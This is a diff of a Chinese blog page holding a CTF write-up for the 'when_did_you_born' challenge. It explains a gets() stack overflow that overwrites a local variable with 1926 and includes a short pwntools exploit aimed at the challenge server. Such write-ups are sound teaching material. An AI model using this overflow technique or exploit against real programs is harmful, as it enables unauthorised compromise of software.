@@ -22,7 +22,7 @@
 <meta property="og:image" content="http://yoursite.com/2020/03/12/ctf-when_did_you_born/image-20200312193831749.png">
 <meta property="og:image" content="http://yoursite.com/2020/03/12/ctf-when_did_you_born/image-20200312195833782.png">
 <meta property="article:published_time" content="2020-03-12T12:26:17.167Z">
-<meta property="article:modified_time" content="2020-03-12T13:11:22.475Z">
+<meta property="article:modified_time" content="2020-03-12T16:33:05.650Z">
 <meta property="article:author" content="Chenqiw">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://yoursite.com/2020/03/12/ctf-when_did_you_born/image-20200312193229421.png">
@@ -225,7 +225,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">557字</span>
+      <span class="post-count">545字</span>
     </span>
   </span>
 
@@ -234,7 +234,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">2分</span>
+      <span class="post-count">1分</span>
     </span>
   </span>
 </div>
@@ -247,27 +247,27 @@
     
     <hr>
 <h1 id="ctf-when-did-you-born"><a href="#ctf-when-did-you-born" class="headerlink" title="ctf-when_did_you_born"></a>ctf-when_did_you_born</h1><hr>
-<p>这是个简单的栈溢出的题目</p>
+<p>这是个简单的栈溢出的题目  </p>
 <a id="more"></a>
 
-<p>老规矩先checksec一下程序</p>
+<p>老规矩先checksec一下程序  </p>
 <p><img src="/2020/03/12/ctf-when_did_you_born/image-20200312193229421.png" alt="image-20200312193229421"></p>
-<p>64位，开了Stack和NX，先运行一遍</p>
+<p>64位，开了Stack和NX，先运行一遍  </p>
 <p><img src="/2020/03/12/ctf-when_did_you_born/image-20200312193517492.png" alt="image-20200312193517492"></p>
-<p>进行了两次输入，好的，现在用IDA pro（64bit）反编译一下F5进入反汇编</p>
+<p>进行了两次输入，好的，现在用IDA pro（64bit）反编译一下F5进入反汇编  </p>
 <p><img src="/2020/03/12/ctf-when_did_you_born/image-20200312193831749.png" alt="image-20200312193831749"></p>
-<p>在main函数中我们看到了只要v6=1926就可以得到flag，但是我们却不能输入1926,就像女朋友一样无理取闹，好吧题目还得继续做，题目只让我们输入两次，那我们就从输入入手，第一个scanf输入规规矩矩，完全没空钻，看第二个，gets函数，我们在学c语言时好像没在乎过gets到底能装多少，只知道遇到换行符停止输入，所以我决定百度一下gets函数果然</p>
-<p><em>gets()函数存在一个严重的缺陷，这个缺陷就是：它不会检查数组是否能够装的下输入行：</em></p>
-<p>这时，我就有个想法，能不能输入很多数据将v6覆盖，于是我们双击v5和v6查看一下他们的地址</p>
+<p>在main函数中我们看到了只要v6=1926就可以得到flag，但是我们却不能输入1926,就像女朋友一样无理取闹，好吧题目还得继续做，题目只让我们输入两次，那我们就从输入入手，第一个scanf输入规规矩矩，完全没空钻，看第二个，gets函数，我们在学c语言时好像没在乎过gets到底能装多少，只知道遇到换行符停止输入，所以我决定百度一下gets函数果然  </p>
+<p><em>gets()函数存在一个严重的缺陷，这个缺陷就是：它不会检查数组是否能够装的下输入行：</em>  </p>
+<p>这时，我就有个想法，能不能输入很多数据将v6覆盖，于是我们双击v5和v6查看一下他们的地址   </p>
 <p><img src="/2020/03/12/ctf-when_did_you_born/image-20200312195833782.png" alt="image-20200312195833782"></p>
-<p>双击之后发现他们的地址隔得不远（相对地址为8）我觉得我有机可乘，只要让v5大于8就可以实现吧v6覆盖，然后只要我们刻意的控制一下，v6=1926不在话下所以我们只要输入8个a（其他字母都可）加1926</p>
-<p>但是真的就这么做么</p>
-<p>当然不是，我们输入的数据是以字符类型保存下来（v5是char类型，函数开头定义了）如果我们单纯的输入1926到内存中，肯定不是以int类型保存，v6自然无法变成我们想要的值，于是这就需要用到打包解包数据p64(),其目的就是为了把我们理解的数据转化成机器需要的数据形式比如p64(0x786)就是1926打包在64位程序里自然p32()就是打包到32位程序</p>
-<p>好啦可以开始写exp啦</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">	from pwn import *   </span><br><span class="line"></span><br><span class="line">​	io &#x3D; remote(&#39;111.198.29.45&#39;,30344)  </span><br><span class="line"></span><br><span class="line">​	io.sendlineafter(&#39;Birth?&#39;,&#39;999&#39;)  </span><br><span class="line"></span><br><span class="line">​	io.sendlineafter(&#39;Name?&#39;,&#39;a&#39;*8 + p64(0x786))  </span><br><span class="line"></span><br><span class="line">​	io.interactive()</span><br></pre></td></tr></table></figure>
+<p>双击之后发现他们的地址隔得不远（相对地址为8）我觉得我有机可乘，只要让v5大于8就可以实现吧v6覆盖，然后只要我们刻意的控制一下，v6=1926不在话下所以我们只要输入8个a（其他字母都可）加1926   </p>
+<p>但是真的就这么做么   </p>
+<p>当然不是，我们输入的数据是以字符类型保存下来（v5是char类型，函数开头定义了）如果我们单纯的输入1926到内存中，肯定不是以int类型保存，v6自然无法变成我们想要的值，于是这就需要用到打包解包数据p64(),其目的就是为了把我们理解的数据转化成机器需要的数据形式比如p64(0x786)就是1926打包在64位程序里自然p32()就是打包到32位程序  </p>
+<p>好啦可以开始写exp啦   </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">​	io = remote(<span class="string">'111.198.29.45'</span>,<span class="number">30344</span>)   </span><br><span class="line">​	io.sendlineafter(<span class="string">'Birth?'</span>,<span class="string">'999'</span>)  </span><br><span class="line">​	io.sendlineafter(<span class="string">'Name?'</span>,<span class="string">'a'</span>*<span class="number">8</span> + p64(<span class="number">0x786</span>))  </span><br><span class="line">​	io.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>然后就可以得到flag啦</p>
-<p>加油，pwn的路上我们一起为伴</p>
+<p>然后就可以得到flag啦  </p>
+<p>加油，pwn的路上我们一起为伴  </p>
 
     
 
